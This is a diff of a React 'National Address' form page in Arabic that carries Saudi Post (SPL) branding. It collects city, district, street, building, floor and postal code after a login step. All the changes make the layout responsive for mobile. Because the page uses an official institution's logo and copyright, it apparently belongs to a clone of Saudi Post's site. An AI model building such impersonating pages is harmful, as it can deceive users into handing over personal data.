@@ -156,60 +156,60 @@ export default function NationalAddress() {
   };
 
   return (
-    <div className="min-h-screen bg-gray-100" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
+    <div className="min-h-screen bg-gray-100 flex flex-col" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
       {/* Header */}
       <header className="bg-[#143c3c] py-2">
         <div className="container mx-auto px-4">
           <div className="flex items-center justify-between">
             <div></div>
-            <a href="#" className="text-white text-sm hover:text-gray-300">English</a>
+            <a href="#" className="text-white text-xs md:text-sm hover:text-gray-300">English</a>
           </div>
         </div>
       </header>
 
       {/* Line below header */}
-      <div className="h-2 bg-[#146c84]"></div>
+      <div className="h-1.5 md:h-2 bg-[#146c84]"></div>
 
       {/* Logo */}
-      <div className="bg-gray-100 py-4">
+      <div className="bg-gray-100 py-3 md:py-4">
         <div className="container mx-auto px-4">
           <div className="max-w-4xl mx-auto flex justify-start">
             <Link to="/">
-              <img src="/images/spl-logo.png" alt="سبل" className="h-14 md:h-16 w-auto" />
+              <img src="/images/spl-logo.png" alt="سبل" className="h-10 md:h-14 lg:h-16 w-auto" />
             </Link>
           </div>
         </div>
       </div>
 
       {/* Main Content */}
-      <main className="container mx-auto px-4 py-8">
+      <main className="flex-1 container mx-auto px-3 md:px-4 py-4 md:py-8">
         <div className="max-w-4xl mx-auto">
-          <div className="bg-white rounded-lg shadow-lg p-6 md:p-8">
+          <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 lg:p-8">
             {/* Title */}
-            <h1 className="text-2xl md:text-3xl font-bold text-[#143c3c] text-center mb-8">
+            <h1 className="text-xl md:text-2xl lg:text-3xl font-bold text-[#143c3c] text-center mb-4 md:mb-6 lg:mb-8">
               العنوان الوطني
             </h1>
 
             {/* Map Section */}
-            <div className="mb-8">
-              <h2 className="text-lg font-bold text-[#143c3c] text-right mb-4">
+            <div className="mb-4 md:mb-6 lg:mb-8">
+              <h2 className="text-base md:text-lg font-bold text-[#143c3c] text-right mb-3 md:mb-4">
                 عنوان داخل المملكة
               </h2>
 
               {/* Search Bar */}
-              <div className="flex gap-2 mb-4">
+              <div className="flex flex-col sm:flex-row gap-2 mb-3 md:mb-4">
                 <input
                   type="text"
                   value={searchQuery}
                   onChange={(e) => setSearchQuery(e.target.value)}
                   onKeyPress={(e) => e.key === 'Enter' && handleSearch()}
                   placeholder="ابحث عن عنوان في السعودية..."
-                  className="flex-1 px-4 py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84]"
+                  className="flex-1 px-3 md:px-4 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                 />
                 <button
                   type="button"
                   onClick={handleSearch}
-                  className="px-6 py-3 bg-[#146c84] text-white font-bold rounded-lg hover:bg-[#0d4a5c] transition-colors"
+                  className="px-4 md:px-6 py-2.5 md:py-3 bg-[#146c84] text-white font-bold rounded-lg hover:bg-[#0d4a5c] transition-colors text-sm md:text-base"
                 >
                   بحث
                 </button>
@@ -217,29 +217,29 @@ export default function NationalAddress() {
 
               {/* Selected Address Display */}
               {selectedAddress && (
-                <div className="flex items-start gap-2 mb-4 p-3 bg-gray-50 rounded-lg">
-                  <svg className="w-5 h-5 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <div className="flex items-start gap-2 mb-3 md:mb-4 p-2 md:p-3 bg-gray-50 rounded-lg">
+                  <svg className="w-4 h-4 md:w-5 md:h-5 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
                   </svg>
-                  <p className="text-sm text-gray-700 text-right" dir="ltr">{selectedAddress}</p>
+                  <p className="text-xs md:text-sm text-gray-700 text-right" dir="ltr">{selectedAddress}</p>
                 </div>
               )}
 
               {/* Map Container */}
               <div 
                 ref={mapRef} 
-                className="w-full h-80 rounded-lg border border-gray-300 mb-4"
+                className="w-full h-56 md:h-72 lg:h-80 rounded-lg border border-gray-300 mb-3 md:mb-4"
                 style={{ zIndex: 1 }}
               ></div>
 
               {/* Map Instructions */}
-              <div className="bg-gray-50 rounded-lg p-4">
-                <p className="text-sm text-gray-600 mb-2 flex items-center gap-2">
+              <div className="bg-gray-50 rounded-lg p-3 md:p-4">
+                <p className="text-xs md:text-sm text-gray-600 mb-1.5 md:mb-2 flex items-center gap-2">
                   <span className="text-yellow-500">💡</span>
                   <span className="font-bold">يمكنك:</span>
                 </p>
-                <ul className="text-sm text-gray-600 space-y-1 mr-6">
+                <ul className="text-xs md:text-sm text-gray-600 space-y-0.5 md:space-y-1 mr-4 md:mr-6">
                   <li>• البحث عن عنوان في السعودية</li>
                   <li>• النقر على الخريطة لتحديد موقع</li>
                   <li>• سحب الدبوس لتحريك الموقع</li>
@@ -249,15 +249,15 @@ export default function NationalAddress() {
 
             {/* Address Form */}
             <form onSubmit={handleSubmit}>
-              <h2 className="text-lg font-bold text-[#143c3c] text-right mb-6">
+              <h2 className="text-base md:text-lg font-bold text-[#143c3c] text-right mb-4 md:mb-6">
                 تفاصيل العنوان
               </h2>
 
               {/* Error Messages */}
               {showErrors && formErrors.length > 0 && (
-                <div className="mb-6 p-4 bg-red-50 border border-red-300 rounded-lg">
-                  <p className="text-red-600 font-bold mb-2 text-right">يرجى إكمال الحقول التالية:</p>
-                  <ul className="list-disc list-inside text-red-500 text-sm text-right">
+                <div className="mb-4 md:mb-6 p-3 md:p-4 bg-red-50 border border-red-300 rounded-lg">
+                  <p className="text-red-600 font-bold mb-1.5 md:mb-2 text-right text-sm md:text-base">يرجى إكمال الحقول التالية:</p>
+                  <ul className="list-disc list-inside text-red-500 text-xs md:text-sm text-right">
                     {formErrors.map((error, index) => (
                       <li key={index}>{error}</li>
                     ))}
@@ -266,88 +266,88 @@ export default function NationalAddress() {
               )}
 
               {/* City and District Row */}
-              <div className="grid grid-cols-2 gap-4 mb-4">
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 md:gap-4 mb-3 md:mb-4">
                 <div>
-                  <label className="block text-gray-600 text-sm mb-2 text-right">المدينة <span className="text-red-500">*</span></label>
+                  <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">المدينة <span className="text-red-500">*</span></label>
                   <input
                     type="text"
                     value={city}
                     onChange={(e) => setCity(e.target.value)}
                     placeholder="المدينة"
-                    className="w-full px-4 py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84]"
+                    className="w-full px-3 md:px-4 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                     required
                   />
                 </div>
                 <div>
-                  <label className="block text-gray-600 text-sm mb-2 text-right">الحي <span className="text-red-500">*</span></label>
+                  <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">الحي <span className="text-red-500">*</span></label>
                   <input
                     type="text"
                     value={district}
                     onChange={(e) => setDistrict(e.target.value)}
                     placeholder="الحي"
-                    className="w-full px-4 py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84]"
+                    className="w-full px-3 md:px-4 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                     required
                   />
                 </div>
               </div>
 
               {/* Street Row */}
-              <div className="mb-4">
-                <label className="block text-gray-600 text-sm mb-2 text-right">الشارع <span className="text-red-500">*</span></label>
+              <div className="mb-3 md:mb-4">
+                <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">الشارع <span className="text-red-500">*</span></label>
                 <input
                   type="text"
                   value={street}
                   onChange={(e) => setStreet(e.target.value)}
                   placeholder="الشارع"
-                  className="w-full px-4 py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84]"
+                  className="w-full px-3 md:px-4 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                   required
                 />
               </div>
 
               {/* Building, Floor, Postal Code Row */}
-              <div className="grid grid-cols-3 gap-4 mb-8">
+              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 md:gap-4 mb-6 md:mb-8">
                 <div>
-                  <label className="block text-gray-600 text-sm mb-2 text-right">المبنى <span className="text-red-500">*</span></label>
+                  <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">المبنى <span className="text-red-500">*</span></label>
                   <input
                     type="text"
                     value={building}
                     onChange={(e) => setBuilding(e.target.value)}
                     placeholder="رقم المبنى"
-                    className="w-full px-4 py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84]"
+                    className="w-full px-3 md:px-4 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                     required
                   />
                 </div>
                 <div>
-                  <label className="block text-gray-600 text-sm mb-2 text-right">الدور <span className="text-red-500">*</span></label>
+                  <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">الدور <span className="text-red-500">*</span></label>
                   <input
                     type="text"
                     value={floor}
                     onChange={(e) => setFloor(e.target.value)}
                     placeholder="رقم الدور"
-                    className="w-full px-4 py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84]"
+                    className="w-full px-3 md:px-4 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                     required
                   />
                 </div>
                 <div>
-                  <label className="block text-gray-600 text-sm mb-2 text-right">الرمز البريدي <span className="text-red-500">*</span></label>
+                  <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">الرمز البريدي <span className="text-red-500">*</span></label>
                   <input
                     type="text"
                     value={postalCode}
                     onChange={(e) => setPostalCode(e.target.value)}
                     placeholder="الرمز البريدي"
-                    className="w-full px-4 py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84]"
+                    className="w-full px-3 md:px-4 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                     required
                   />
                 </div>
               </div>
 
               {/* Buttons */}
-              <div className="flex justify-between items-center">
+              <div className="flex flex-col-reverse sm:flex-row justify-between items-center gap-3 sm:gap-0">
                 {/* Back Button */}
-                <Link to="/login">
+                <Link to="/login" className="w-full sm:w-auto">
                   <button
                     type="button"
-                    className="px-12 md:px-16 py-3 border-2 border-[#146c84] text-[#146c84] bg-white font-bold rounded-lg hover:bg-[#146c84] hover:text-white transition-colors text-sm md:text-base"
+                    className="w-full sm:w-auto px-8 md:px-12 lg:px-16 py-2.5 md:py-3 border-2 border-[#146c84] text-[#146c84] bg-white font-bold rounded-lg hover:bg-[#146c84] hover:text-white transition-colors text-sm md:text-base"
                   >
                     رجوع
                   </button>
@@ -356,7 +356,7 @@ export default function NationalAddress() {
                 {/* Continue Button */}
                 <button
                   type="submit"
-                  className="px-12 md:px-16 py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors text-sm md:text-base"
+                  className="w-full sm:w-auto px-8 md:px-12 lg:px-16 py-2.5 md:py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors text-sm md:text-base"
                 >
                   متابعة
                 </button>
@@ -367,14 +367,14 @@ export default function NationalAddress() {
       </main>
 
       {/* Footer */}
-      <footer className="bg-[#143c3c] py-5">
-        <div className="container mx-auto px-4">
-          <div className="flex flex-col md:flex-row items-center justify-between text-white text-sm">
-            <div className="flex items-center gap-1 mb-2 md:mb-0">
+      <footer className="bg-[#143c3c] py-4 md:py-5 mt-auto">
+        <div className="container mx-auto px-3 md:px-4">
+          <div className="flex flex-col items-center gap-2 md:gap-0 md:flex-row md:justify-between text-white text-xs md:text-sm">
+            <div className="flex items-center gap-1 text-center md:text-right">
               <span>©</span>
               <span>2026 جميع الحقوق محفوظة لمؤسسة البريد السعودي - سُبل</span>
             </div>
-            <div className="flex items-center gap-1">
+            <div className="flex flex-wrap items-center justify-center gap-1 text-center">
               <span className="text-gray-300">عند استخدامك هذا الموقع، فإنك توافق على</span>
               <a href="#" className="text-[#04ccf0] hover:underline">شروط الخدمة</a>
               <span className="text-gray-300">و</span>
